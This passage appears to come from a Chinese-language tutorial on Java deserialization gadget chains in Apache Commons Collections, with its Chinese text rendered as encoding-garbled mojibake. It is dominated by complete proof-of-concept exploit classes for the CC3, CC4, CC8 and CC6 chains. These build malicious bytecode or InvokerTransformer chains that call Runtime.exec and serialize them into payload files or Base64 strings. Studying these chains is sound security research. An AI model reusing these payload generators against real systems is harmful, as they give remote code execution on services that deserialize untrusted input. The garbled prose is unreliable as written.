TiedMapEntry.toString -> * TiedMapEntry.getValue -> * (this.map.get)LazyMap.get -> * ChainedTransformer.transform * */ TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null); // setFieldValue(badAttributeValueExpException, \"val\", tiedMapEntry); //è°ƒç”¨CC2å†™å¥½çš„è®¾ç½®å‡½æ•° // å•ç‹¬è®¾ç½® Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(badAttributeValueExpException); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } JDK1.8 AnnotationInvocationHandler ä¿®æ”¹ 50è¡Œå·¦å³ç§»é™¤ memberValue.setValue CC3_InstantiateTransformer é€‚ç”¨ç‰ˆæœ¬ï¼š3.1-3.2.1ï¼Œjdk7u21åŠä»¥å‰ InstantiateTransformer public Object transform(Object input) { try { if (input instanceof Class == false) { throw new FunctorException( \"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName())); } Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); } catch (NoSuchMethodException ex) { throw new FunctorException(\"InstantiateTransformer: The constructor must exist and be public \"); } catch (InstantiationException ex) { throw new FunctorException(\"InstantiateTransformer: InstantiationException\", ex); } catch (IllegalAccessException ex) { throw new FunctorException(\"InstantiateTransformer: Constructor must be public\", ex); } catch (InvocationTargetException ex) { throw new FunctorException(\"InstantiateTransformer: Constructor threw an exception\", ex); } } transformæ–¹æ³•ä¼šå»ä½¿ç”¨åå°„å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”è¿”å› TrAXFilter public TrAXFilter (Templates templates) throws TransformerConfigurationException { m_templates = templates; m_transformer = (TransformerImpl)templates.newTransformer(); } è°ƒç”¨äº†ä¼ å…¥å‚æ•°çš„newTransformer()æ–¹æ³•, å»¶ç»­äº†CC2çš„æ„é€ æ¶æ„Classç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ, ä¼ å…¥ç²¾å¿ƒæ„é€ çš„TransformerImplç±»å³å¯ POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC3_InstantiateTransformer { public static void main(String[] args) throws Exception{ // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // åˆ›å»ºTemplatesImplå®ä¾‹ Object templatesImpl=Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templatesImpl, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templatesImpl, \"_name\", \"name\"); /** CC3 TrAXFilterä¸InstantiateTransformerç»“åˆ*/ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); Class clazz = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, outerMap); Map ProxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); Object cc3 = constructor.newInstance(Retention.class, ProxyMap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(cc3); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC4_mixed with CC2 and CC3 é€‚ç”¨ç‰ˆæœ¬ï¼š4.0ï¼Œjdk7u21åŠä»¥å‰ CC4é“¾ä¸­åœ¨è¿™æ®µä»£ç ä¸­å°±åšäº†ä¸€ä¸ªç®€å•çš„ä¿®æ”¹ã€‚ /**CommonsCollections4åŒºåˆ«ä¹‹å¤„*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); ç¬¬ä¸€æ­¥æ˜¯newäº†ä¸€ä¸ªConstantTransformerå¯¹è±¡å­˜å‚¨åœ¨Transformer[]æ•°ç»„ä¸­ä¼ å…¥çš„å‚æ•°æ˜¯TrAXFilter.classï¼Œå¦‚æœè°ƒç”¨åˆ°ConstantTransformerå®ä¾‹åŒ–å¯¹è±¡çš„transformæ–¹æ³•ä¼šç›´æ¥è¿”å›ä¸€ä¸ªTrAXFilterå¯¹è±¡ã€‚ ç¬¬äºŒæ­¥newäº†ä¸€ä¸ªInstantiateTransformerå¯¹è±¡ä¼ å…¥çš„æ˜¯Templates.classå’Œæ„é€ çš„æ¶æ„templateså®ä¾‹åŒ–å¯¹è±¡ã€‚ ç¬¬ä¸‰æ­¥æ˜¯ä½¿ç”¨äº†ChainedTransformerçš„ä¿®é¥°å™¨å°†Transformer[]æ•°ç»„ä¼ å…¥å‚æ•°ï¼Œå½“è°ƒç”¨transformæ–¹æ³•å°†ç»™Transformer[]æ•°ç»„ç»™éå†è°ƒç”¨transformæ–¹æ³•ã€‚ ç¬¬å››æ­¥å°†ChainedTransformerä¿®é¥°åçš„å¯¹è±¡å†ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ç»™ä¿®é¥°ä¸€éï¼Œè¿™é‡Œå†ä½¿ç”¨TransformingComparatoræ¥ä¿®é¥°ä¸€ä¸‹ï¼Œè¿™æ ·ç­‰è°ƒç”¨åˆ°è¯¥å®ä¾‹åŒ–å¯¹è±¡çš„compareæ–¹æ³•çš„æ—¶å€™å°±ä¼šå»éå†è°ƒç”¨Transformer[]çš„transformæ–¹æ³•ã€‚(è¦æ±‚å¿…é¡»æ˜¯Comparatoræ‰å¯èµ‹å€¼this.comparator) POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections4 { public static void main(String[] args) throws Exception{ // å®ä¾‹åŒ–PriorityQueueå¯¹è±¡ PriorityQueue priorityQueue = new PriorityQueue(1); // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = (TemplatesImpl) Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); /**CommonCollections4åŒºåˆ«ä¹‹å¤„*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); // æ–°å»ºä¸€ä¸ªå¯¹è±¡æ•°ç»„ Object[] queueArray = new Object[]{templates, 1}; // åå°„è®¾ç½®PriorityQueueçš„queueå€¼ Field queueField = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queueField.setAccessible(true); queueField.set(priorityQueue, queueArray); // åå°„è®¾ç½®PriorityQueueçš„sizeå€¼ Field queueSize = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); queueSize.setAccessible(true); queueSize.set(priorityQueue, 2); // åå°„è®¾ç½®PriorityQueueçš„comparatorå€¼ Field queueComparator = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); queueComparator.setAccessible(true); queueComparator.set(priorityQueue, transformingComparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(priorityQueue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } CC8_new readObject TreeBag å‚è€ƒ: https://www.anquanke.com/post/id/190472 8ä¸2, 4çš„åŒºåˆ«åœ¨äºä½¿ç”¨äº†æ–°çš„readObjectè§¦å‘ç‚¹TreeBag , 8å¯ä¸2, 4ç»“åˆä½¿ç”¨ TreeBag.readObject private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); @SuppressWarnings(\"unchecked\") // This will fail at runtime if the stream is incorrect final Comparator comp = (Comparator) in.readObject(); // é‡ç‚¹åœ¨doReadObjectå’ŒTreeMap super.doReadObject(new TreeMap(comp), in); } è·Ÿè¿›doReadObject protected void doReadObject(final Map map, final ObjectInputStream in) throws IOException, ClassNotFoundException { this.map = map; final int entrySize = in.readInt(); for (int i = 0; i è·Ÿè¿›Treemap.putå‡½æ•° public V put(K key, V value) { Entry t = root; /*rootåˆå§‹åŒ–æ—¶ä¸ºnull private transient Entry root = null; è·Ÿè¿›ifè¯­å¥ */ if (t == null) { compare(key, key); // type (and possibly null) check root = new Entry<>(key, value, null); size = 1; modCount++; return null; } ... è·Ÿè¿›compareå‡½æ•° final int compare(Object k1, Object k2) { /* æ§åˆ¶æ­¤å¤„çš„comparator private final Comparator comparator; */ return comparator==null ? ((Comparable)k1).compareTo((K)k2) : comparator.compare((K)k1, (K)k2); } é€šè¿‡TransformingComparator.compareè§¦å‘å³å¯ POC package CommonsCollections; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.xalan.transformer.TrAXFilter; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; public class CommonsCollections8 { public static void main(String[] args) throws Exception{ // ClassPoolæ˜¯ CtClass å¯¹è±¡çš„å®¹å™¨ã€‚å®ä¾‹åŒ–ä¸€ä¸ªClassPoolå®¹å™¨ã€‚ ClassPool classPool = ClassPool.getDefault(); // å‘å®¹å™¨ä¸­çš„ç±»æœç´¢è·¯å¾„çš„èµ·å§‹ä½ç½®æ’å…¥AbstractTranslet.classï¼Œä¸ªäººè®¤ä¸ºæ˜¯æ–¹ä¾¿è®©åé¢èƒ½å¤Ÿæ‰¾åˆ°è¿™ä¸ªç±» classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // ä½¿ç”¨å®¹å™¨æ–°å»ºä¸€ä¸ªCtClassï¼Œç›¸å½“äºæ–°å»ºä¸€ä¸ªclassï¼Œç±»åä¸ºEvil CtClass ctClass = classPool.makeClass(\"Evil\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"%s\\\");\"; cmd = String.format(cmd, \"calc.exe\"); // ç»™è¿™ä¸ªç±»åˆ›å»º static ä»£ç å—ï¼Œå¹¶æ’å…¥åˆ°ç±»ä¸­ ctClass.makeClassInitializer().insertBefore(cmd); String className = \"Evil\" + System.nanoTime(); // é‡æ–°è®¾ç½®ç±»åä¸ºä¸€ä¸ªéšæœºçš„åå­— ctClass.setName(className); // ç»™è¿™ä¸ªç±»æ·»åŠ ä¸€ä¸ªçˆ¶ç±»ï¼Œå³ç»§æ‰¿è¯¥çˆ¶ç±»ã€‚ ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName())); // è®¾ç½®çˆ¶ç±»ä¸ºAbstractTransletï¼Œé¿å…æŠ¥é”™ // å°†è¿™ä¸ªç±»è¾“å‡ºåˆ°é¡¹ç›®ç›®å½•ä¸‹ // ctClass.writeFile(\"./\"); // å°†è¿™ä¸ªclassè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ byte[] classBytes = ctClass.toBytecode(); // å°†å­—èŠ‚æ•°ç»„æ”¾ç½®åˆ°ä¸€ä¸ªäºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´  byte[][] targetByteCodes = new byte[][]{classBytes}; // å®ä¾‹åŒ–TemplatesImplå¯¹è±¡ TemplatesImpl templates = (TemplatesImpl) Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\").getDeclaredConstructor(new Class[]{}).newInstance(); /**CommonsCollections4åŒºåˆ«ä¹‹å¤„*/ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer); // é€šè¿‡åå°„è®¾ç½®å­—æ®µçš„å€¼ä¸ºäºŒç»´å­—èŠ‚æ•°ç»„ setFieldValue(templates, \"_bytecodes\", targetByteCodes); // è¿›å…¥ defineTransletClasses() æ–¹æ³•éœ€è¦çš„æ¡ä»¶ setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); /**CommonsCollections8åŒºåˆ«ä¹‹å¤„*/ // å®ä¾‹åŒ–TreeBagå¯¹è±¡ TreeBag treeBag = new TreeBag(transformingComparator); // å°†TemplatesImplå¯¹è±¡æ·»åŠ è‡³TreeBagå»ºç«‹çš„TreeMapä¸­ treeBag.add(templates); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"payload.bin\")); outputStream.writeObject(treeBag); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"payload.bin\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } commons-collections:4.1åŠä»¥ä¸Šçš„æ”¹å˜ å‰é¢æåˆ°çš„CommonsCollections2,4,8ï¼Œéƒ½æ˜¯åœ¨commons-collections:4.0ç‰ˆæœ¬ä¸‹æ‰å¯ä»¥ä½¿ç”¨çš„ã€‚è¿™é‡Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆåœ¨4.1åŠä»¥ä¸Šç‰ˆæœ¬æ— æ³•åˆ©ç”¨ï¼ å‰é¢æˆ‘ä»¬ç”¨åˆ°äº†InvokerTransformerå’ŒInstantiateTransformerä½œä¸ºä¸­è½¬ï¼Œå¾ˆçœŸå®ï¼Œ4.1ç‰ˆæœ¬è¿™ä¸¤ä¸ªç±»éƒ½æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ—¶å°±æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªç±»ã€‚ public class InstantiateTransformer implements Transformer,T> { public class InvokerTransformer implements Transformer { CC6_HashSet å‚è€ƒ: https://www.anquanke.com/post/id/190468 ä¸»è¦ç›®çš„æ˜¯åœ¨HashSet.readObjectè§¦å‘HashMap.putåè¿›è€Œåœ¨TiedMapEntry.hashCodeè§¦å‘LazyMap.get HashSet.readObject() -> HashMap.put(key) => key.hashCode => TiedMapEntry.hashCode -> TiedMapEntry.getValue -> TiedMapEntry.map.get() => LazyMap.get() -> factory.transform() => ChainedTransformer.transform() -> å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CommonsCollections6{ public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"ricky\"); /*jdk1.8*/ HashSet hashSet = new HashSet(1); hashSet.add(tiedMapEntry); outerMap.remove(\"ricky\"); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(hashSet); objectoutputstream.close(); // unserialize ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); objectinputstream.readObject(); objectinputstream.close(); System.out.println(Base64.encodeBase64String(barr.toByteArray())); }catch(Exception e){ e.printStackTrace(); } } } èˆå¼ƒHashSet å› ä¸ºå¯ä»¥ç›´æ¥è°ƒç”¨HashMap.put, å¯ä»¥èˆå¼ƒHashSet.readObjectè¿™ä¸ªå¤šä½™çš„æ¡¥æ¢ è§¦å‘å¤±è´¥é—®é¢˜ ç›´æ¥é‡‡ç”¨HashMap.putä¼šåœ¨debugçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé—®é¢˜ // LazyMap.getæ­¤å¤„çš„keyå€¼ä¸ºkeykey Object value = factory.transform(key); å› ä¸ºåœ¨HashMapçš„putâ½…æ³•ä¸­ï¼Œä¹Ÿæœ‰è°ƒâ½¤åˆ° hash(key) public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } è¿™â¾¥å°±å¯¼è‡´ LazyMap è¿™ä¸ªåˆ©â½¤é“¾åœ¨è¿™â¾¥è¢«è°ƒâ½¤äº†â¼€éï¼Œå› ä¸ºå‰â¾¯â½¤äº† fakeTransformers ï¼Œæ‰€ä»¥æ­¤æ—¶å¹¶æ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§â¾ï¼Œä½†å®é™…ä¸Šä¹Ÿå¯¹æ„é€ Payloadäº§â½£äº†å½±å“ã€‚ è§£å†³â½…æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦å°†keykeyè¿™ä¸ªKeyï¼Œå†ä»outerMapä¸­ç§»é™¤å³å¯ï¼š outerMap.remove(\"keykey\") POC package CommonsCollections; import org.apache.commons.codec.binary.Base64; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CC6_HashMap { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", new Class[0]}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc.exe\"}), new ConstantTransformer(1) }; ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); // è°ƒç”¨decorateä¸»è¦æ˜¯ç›´æ¥å†™å…¥çš„æ–¹æ³•æ˜¯protected, éœ€è¦è®¾ç½®æƒé™æ‰è¡Œ, è€Œè¯¥æ–¹æ³•æ˜¯public Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap, \"keykey\"); /*jdk1.7~jdk1.8*/ Map expMap = new HashMap(); expMap.put(tiedMapEntry, \"valuevalue\"); outerMap.remove(\"keykey\"); //é€šè¿‡åå°„è¦†ç›–åŸæœ¬çš„iTransformersï¼Œé˜²æ­¢åºåˆ—åŒ–æ—¶åœ¨æœ¬åœ°æ‰§è¡Œå‘½ä»¤ Field f = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); try{ // serialize ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream objectoutputstream = new ObjectOutputStream(barr); objectoutputstream.writeObject(expMap); objectoutputstream.close(); // 